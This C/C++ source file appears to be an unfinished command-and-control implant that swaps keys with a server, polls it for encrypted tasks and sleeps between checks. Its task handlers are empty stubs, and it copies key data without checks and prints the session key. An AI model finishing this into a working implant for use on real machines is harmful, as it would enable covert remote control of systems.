
#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <unistd.h>

extern "C"
{
#include "ll.h"
#include "debug.h"
#include "datatypes.h"
#include "curlwrapper.h"
#include "listwrapper.h"
#include "encryption.h"
}

int EXIT = 0;
int TIMEOUT = 10;

//this function send the key material to the server
int send_keymat(localKeys * km){
    MemoryStruct b64_km;
    if (!km) goto fail;
    
    //convert the binary to ascii
    b64_km.memory = base64_encode((const unsigned char *)km->my_pub_key,KEY_LEN,(size_t*)&b64_km.size);
    DEBUG_PRINT("%s",b64_km.memory);

    post_request((char *)PP_KEY_URL, &b64_km);

    //TODO take out here
    free(b64_km.memory);
    return SUCCESS;
fail:
    return FAILURE;
}

//this function recieves the key material from the server 
int recv_keymat(keyMat * km,localKeys *lk){
    MemoryStruct b64_km;
    MemoryStruct sender_key;
    if (!km || !lk) goto fail;
    
    b64_km.memory = NULL;
    get_request(&b64_km,(char *)PP_KEY_URL);
    
    DEBUG_PRINT("%s",b64_km.memory);

    sender_key.memory = base64_decode((const unsigned char *)b64_km.memory,(size_t)b64_km.size,(size_t*)&sender_key.size);
    
    //copy their keymat into the km structure
    //what should i be checking for here
    //TODO
    memcpy(km->sender_pub_key,sender_key.memory,KEY_LEN);
    
    //copy my private key
    memcpy(km->my_priv_key,lk->my_priv_key,KEY_LEN);
    
    //derive the session key
    derive_session_key(km);
    print_key(km->shared_key,(char *)"shared key: ");
    
    free(b64_km.memory);
    free(sender_key.memory);
    return SUCCESS;
fail:
    return FAILURE;
}

//this function recieves the key material from the server 
int get_task(keyMat * km,DecryptedBytes* db){
    MemoryStruct b64_tb;
    MemoryStruct enc_tb;

    EncryptedBytes eb;

    int offset = 0;

    if (!km || !db) goto fail;
    
    b64_tb.memory = NULL;

    //get the task
    get_request(&b64_tb,(char *)PP_TASK_URL);
    DEBUG_PRINT("request returned size: %d",b64_tb.size);
    DEBUG_PRINT("%s",b64_tb.memory);
    
    //TODO test here
    if (0 == b64_tb.size){
        goto fail;
    } 
    
    //unbase 64 it
    enc_tb.memory = base64_decode((const unsigned char *)b64_tb.memory,(size_t)b64_tb.size,(size_t*)&enc_tb.size);  
    
    print_bytes(enc_tb.memory,enc_tb.size);
    //sets the pointer to the right offset...this is ugly as sin
    //((EncryptedBytes*)enc_tb.memory)->cypher_text = (uint8_t*)(((void*)&enc_tb + (sizeof(EncryptedBytes))));  

    offset = sizeof(EncryptedBytes) - sizeof(uint8_t*)+4;
    memcpy((void*)&eb,enc_tb.memory,offset);

    eb.cypher_text =(uint8_t*) malloc(eb.len);
    memcpy(eb.cypher_text,enc_tb.memory+offset,eb.len);

    //decrypt it
    dec(db, km, &eb);

    DEBUG_PRINT("tasking: %s",(char*)db->plain_text);

    free(b64_tb.memory);
    free(enc_tb.memory);
    
    return SUCCESS;
fail:
    return FAILURE;
}

//this function recieves the key material from the server 
int send_result(keyMat * km, DecryptedBytes* db){
    if (!km || !db) goto fail;
    MemoryStruct b64_tb;

    EncryptedBytes eb;
    

    //encrypt it 
    enc(&eb, km, db);

    //base64 it
    b64_tb.memory = base64_encode((const unsigned char *)&eb,eb.len,(size_t*)&b64_tb.size);
    DEBUG_PRINT("%s",b64_tb.memory);

    post_request((char *)PP_KEY_URL, &b64_tb);

    //TODO take out here
    free(b64_tb.memory);
    return SUCCESS;
fail:
    return FAILURE;
}

int TASK_echo(taskBytes *tb){
    if (!tb) goto fail;

        return SUCCESS;
    fail:
        return FAILURE;
}

int TASK_timeout(taskBytes *tb){
    if (!tb) goto fail;

        return SUCCESS;
    fail:
        return FAILURE;
    
}

int TASK_exit(taskBytes *tb){
    if (!tb) goto fail;

        return SUCCESS;
    fail:
        return FAILURE;
}

int main()
{
    wrapper_curl_init();
    
    localKeys me;
    keyMat session;  
    DecryptedBytes task;
    //DecryptedBytes response;

    DEBUG_PRINT("SPITESTORE\n");
 
    //generates my local keys
    gen_keys(&me);

    //send my keymat
    send_keymat(&me);
    
    //recv their keymat
    recv_keymat(&session,&me);
    
    //task loop
    while (!EXIT){

        DEBUG_PRINT("checking for tasking\n");
        if (FAILURE == get_task(&session,&task)) goto next;

        //send_result(&session,&response);
        //DEBUG_PRINT("sleeping %d seconds\n",TIMEOUT);
next:
        sleep(TIMEOUT);
        
    }
    wrapper_curl_free();
   
}